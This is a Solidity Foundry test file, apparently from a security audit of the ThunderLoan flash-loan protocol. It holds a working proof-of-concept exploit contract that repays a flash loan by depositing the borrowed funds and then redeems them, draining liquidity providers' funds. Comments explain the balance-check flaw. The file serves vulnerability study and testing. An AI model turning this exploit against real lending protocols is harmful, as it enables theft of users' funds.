// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import { Test, console } from "forge-std/Test.sol";
import { BaseTest, ThunderLoan } from "./BaseTest.t.sol";
import { AssetToken } from "../../src/protocol/AssetToken.sol";
import { MockFlashLoanReceiver } from "../mocks/MockFlashLoanReceiver.sol";
import { ERC20Mock } from "../mocks/ERC20Mock.sol";
import { ERC1967Proxy } from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import { BuffMockPoolFactory } from "../mocks/BuffMockPoolFactory.sol";
import { BuffMockTSwap } from "../mocks/BuffMockTSwap.sol";
import { IFlashLoanReceiver } from "../../src/interfaces/IFlashLoanReceiver.sol";
import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract CritVulnerable is BaseTest {
    uint256 constant AMOUNT_10e18 = 10e18;
    uint256 constant DEPOSIT_AMOUNT = AMOUNT_10e18 * 100;
    address liquidityProvider = address(123);
    address user = address(456);
    MockFlashLoanReceiver mockFlashLoanReceiver;

    function setUp() public override {
        super.setUp();
        vm.prank(user);
        mockFlashLoanReceiver = new MockFlashLoanReceiver(address(thunderLoan));
    }

    modifier setAllowedToken() {
        vm.prank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, true);
        _;
    }

    modifier hasDeposits() {
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, DEPOSIT_AMOUNT);
        tokenA.approve(address(thunderLoan), DEPOSIT_AMOUNT);
        thunderLoan.deposit(tokenA, DEPOSIT_AMOUNT);
        vm.stopPrank();
        _;
    }
    // Now that we know the repay function is not strictly necessary to succesfully close the flashloan, but it only
    // looks at the balance, we can test matching the balance by depositing. (like a liquidity provider).

    function testUseDepositInsteadOfRepayToStealFunds() public setAllowedToken hasDeposits {
        vm.prank(user);
        uint256 amountToBorrow = 50e18;
        uint256 fee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);
        DepositOverRepay dor = new DepositOverRepay(address(thunderLoan));
        tokenA.mint(address(dor), fee);
        thunderLoan.flashloan(address(dor), tokenA, amountToBorrow, "");
        dor.redeemMoney();
        vm.stopPrank();

        assert(tokenA.balanceOf(address(dor)) > 50e18 + fee);
    }
}
//The vulnerability allows an attacker to borrow funds via a flash loan and manipulate the protocol to keep those funds
// without repaying the loan.
// the executeOperation function manipulates the flashloaned funds by depositing them back into the ThunderLoan protocol
// instead of repaying the flash loan.
// The redeemMoney function is then called to redeem the flashloaned money, effectively stealing the funds without
// repaying the flash loan.

// The vulnerability arises from the fact that the protocol relies solely on checking the balance of the asset token to
// determine if the flash loan is repaid. Instead of explicitly checking if the repay function was successfully called
// or if a lower-level transfer occurred to repay the loan, it assumes that if the balance of the asset token increases
// by the expected amount (flashloaned amount + fee), then the flash loan is considered repaid.

//This discrepancy between checking the balance and verifying the proper execution of the repay function introduces the
// vulnerability, allowing an attacker to exploit the protocol by depositing and then redeeming the flashloaned funds
// without executing the intended repayment logic.

contract DepositOverRepay is IFlashLoanReceiver {
    ThunderLoan thunderLoan;
    AssetToken assetToken;
    address assetTokenAddress;
    IERC20 s_token;

    constructor(address _thunderLoan) {
        thunderLoan = ThunderLoan(_thunderLoan);
    }
    // the flashloan receiver (interface) so if we call thunderloan.flashloan() this runs:

    function executeOperation(
        address token, // the token that's being borrowed
        uint256 amount,
        uint256 fee,
        address, /* initiator */
        bytes calldata /*params*/
    )
        external
        returns (bool)
    {
        s_token = IERC20(token);
        assetToken = thunderLoan.getAssetFromToken(IERC20(token));
        // Approve the amount + fee for depositing
        IERC20(token).approve(address(thunderLoan), amount + fee);
        // Trigger deposit using the flashloaned amount + fee
        thunderLoan.deposit(IERC20(token), amount + fee);
        return true;
    }

    // Function to redeem the flashloaned money
    function redeemMoney() public {
        uint256 amount = assetToken.balanceOf(address(this));
        thunderLoan.redeem(s_token, amount);
    }
}
